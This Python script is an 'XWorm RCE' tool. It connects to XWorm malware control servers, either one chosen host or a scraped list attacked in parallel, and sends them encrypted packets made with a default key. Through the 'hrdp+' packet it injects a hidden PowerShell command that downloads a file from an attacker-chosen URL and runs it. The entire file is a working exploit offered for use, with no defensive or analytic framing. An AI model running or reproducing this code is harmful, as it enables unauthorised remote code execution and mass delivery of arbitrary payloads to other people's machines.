import socket
import io
import time
import random
import string
import hashlib
import os
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from colorama import init, Fore
import sys
import traceback

init(autoreset=True)

default = "<123456789>"
max_threads = 40 
print_lock = threading.Lock()

class Packet:
    def __init__(self, *data: list[bytes]):
        self.data = data

    def write(self, buffer):
        try:
            buffer.write(b'<Xwormmm>'.join(self.data))
        except Exception as e:
            print(Fore.RED + f"[-] Error writing packet: {str(e)}")
            raise

    def bytes(self):
        try:
            b = io.BytesIO()
            self.write(b)
            return b.getbuffer().tobytes()
        except Exception as e:
            print(Fore.RED + f"[-] Error getting packet bytes: {str(e)}")
            raise

def genid(length=8):
    try:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))
    except Exception as e:
        print(Fore.RED + f"[-] Error making a client id: {str(e)}")
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def clear():
    try:
        os.system("cls") if os.name == "nt" else os.system("clear")
    except Exception:
        pass

def send(sock, packet, key):
    try:
        hashed = hashlib.md5(key.encode()).digest()
        cipher = AES.new(hashed, AES.MODE_ECB)
        encrypted = cipher.encrypt(pad(packet.bytes(), 16))
        sock.send(str(len(encrypted)).encode() + b'\0')
        sock.send(encrypted)
        return encrypted
    except Exception as e:
        print(Fore.RED + f"[-] Error sending packet: {str(e)}")
        raise

def exec_target(host, port, key, url):
    try:
        if not host or not port or not key or not url:
            raise ValueError("Missing stuff")

        cid = genid()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(6)
        
        try:
            sock.connect((host, int(port)))
        except (socket.gaierror, socket.timeout, ConnectionRefusedError) as e:
            raise ConnectionError(f"Connection failed: {str(e)}")
        except ValueError as e:
            raise ValueError(f"Invalid port number: {str(e)}")

        try:
            send(sock, Packet(b'hrdp', cid.encode()), key)
        except Exception as e:
            raise ConnectionError(f"Failed to send initial packet: {str(e)}")

        if url.lower().endswith('.bat'):
            ext = '.bat'
            mode = "Batch"
        elif url.lower().endswith('.ps1'):
            ext = '.ps1'
            mode = "Powershell"
        elif url.lower().endswith('.js') or url.lower().endswith('.jse') or url.lower().endswith('.wsf'):
            ext = '.js'
            mode = "JScript"
        else:
            ext = '.exe'
            mode = "Other"
            
        name = f"{genid(5)}{ext}"

        try:
            if ext == '.bat':
                print(Fore.YELLOW + f"[?] Using mode: {mode}")
                cmd = f"start powershell.exe -WindowStyle Hidden $u=\\\"{url}\\\";$o=\\\"$env:TEMP\\\\{name}\\\";Invoke-WebRequest -Uri $u -OutFile $o;Start-Process -FilePath 'cmd.exe' -ArgumentList '/c',$o; taskkill /f /IM mstsc.exe"
            elif ext == '.ps1':
                print(Fore.YELLOW + f"[?] Using mode: {mode}")
                cmd = f"start powershell.exe -WindowStyle Hidden iex (irm '{url}')"
            elif ext == '.js':
                print(Fore.YELLOW + f"[?] Using mode: {mode}")
                cmd = f"start powershell.exe -WindowStyle Hidden $u=\\\"{url}\\\";$o=\\\"$env:TEMP\\\\{name}\\\";Invoke-WebRequest -Uri $u -OutFile $o;Start-Process -FilePath 'wscript.exe' -ArgumentList $o; taskkill /f /IM mstsc.exe"
            else:
                print(Fore.YELLOW + f"[?] Using mode: {mode}")
                cmd = f"start powershell.exe -WindowStyle Hidden taskkill /f /IM mstsc.exe; $u=\\\"{url}\\\"; $o=\\\"$env:TEMP\\\\{name}\\\"; Invoke-WebRequest -Uri $u -OutFile $o; cmd.exe /c start \"\" $o; taskkill /f /IM mstsc.exe"
        except Exception as e:
            raise ValueError(f"Failed to construct command: {str(e)}")

        try:
            send(sock, Packet(b'hrdp+', cid.encode(), b" x", f"\" & {cmd}".encode(), b"x"), key)
        except Exception as e:
            raise ConnectionError(f"Failed to rce packet: {str(e)}")
        finally:
            try:
                sock.close()
            except Exception:
                pass

        with print_lock:
            print(Fore.GREEN + f"[+] Executed on {host}:{port}", flush=True)
        return 'Success'

    except Exception as e:
        err_msg = str(e).split(']')[-1][:40].strip()
        with print_lock:
            print(Fore.RED + f"[-] Failed {host}:{port} - {err_msg}", flush=True)
        return 'Failure'


def safe_input(prompt, default_value=None):
    try:
        value = input(prompt).strip()
        return value if value else default_value
    except (KeyboardInterrupt, EOFError):
        print(Fore.YELLOW + "\n[!] Cancelled")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[-] Input error: {str(e)}")
        return default_value

def run():
    try:
        clear()
        print(Fore.RED + r"""

____  _____      __                      __________              
\   \/  /  \    /  \___________  _____   \______   \ ____  ____  
 \     /\   \/\/   /  _ \_  __ \/     \   |       _// ___\/ __ \ 
 /     \ \        (  <_> )  | \/  Y Y  \  |    |   \  \__\  ___/ 
/___/\  \ \__/\  / \____/|__|  |__|_|  /  |____|_  /\___  >___  >
      \_/      \/                    \/          \/     \/    \/ 

                                       
    """)
        
        url = safe_input(Fore.YELLOW + "[?] Enter your file url: ")
        if not url:
            print(Fore.RED + "[-] URL is required")
            return

        rceorscrape = safe_input(Fore.YELLOW + "[?] RCE one C2 or rce c2s you scraped? (specific / scrape): ")
        key = default

        if rceorscrape.lower() in ["specific", "myc2", "specificc2", "onec2"]:
            host = safe_input(Fore.YELLOW + "[?] Enter host: ")
            port = safe_input(Fore.YELLOW + "[?] Enter port: ")
            thekey = safe_input(Fore.YELLOW + f"[?] Enter key (default {key}): ", key)

            if not host or not port:
                print(Fore.RED + "[-] Host and port are required")
                return

            exec_target(host, port, thekey, url)

        elif rceorscrape.lower() in ["scrape", "scraped", "scraper", "scraping"]:
            try:
                with open("reports.txt") as f:
                    targets = [line.strip() for line in f if ':' in line.strip()]
            except FileNotFoundError:
                print(Fore.RED + "[-] reports.txt not found")
                return
            except Exception as e:
                print(Fore.RED + f"[-] Error reading reports.txt: {str(e)}")
                return

            if not targets:
                print(Fore.YELLOW + "[!] No valid c2s found in reports.txt")
                return

            print(Fore.YELLOW + f"[+] Found {len(targets)} targets")
            
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_target = {}
                for target in targets:
                    try:
                        host, port = target.split(":")
                        future = executor.submit(exec_target, host, port, key, url)
                        future_to_target[future] = target
                    except ValueError:
                        print(Fore.RED + f"[-] Invalid target format: {target}")
                        continue
                    except Exception as e:
                        print(Fore.RED + f"[-] Error rceing c2 {target}: {str(e)}")
                        continue

                for future in as_completed(future_to_target, timeout=None):
                    target = future_to_target[future]
                    try:
                        future.result()
                    except Exception as e:
                        print(Fore.RED + f"[-] Error processing c2 {target}: {str(e)}")
                        continue

        else:
            print(Fore.RED + "[-] Invalid option selected")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Cancelled")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error: {str(e)}")
        traceback.print_exc()
        return

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Cancelled")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[-] Critical error: {str(e)}")
        traceback.print_exc()
        sys.exit(1)

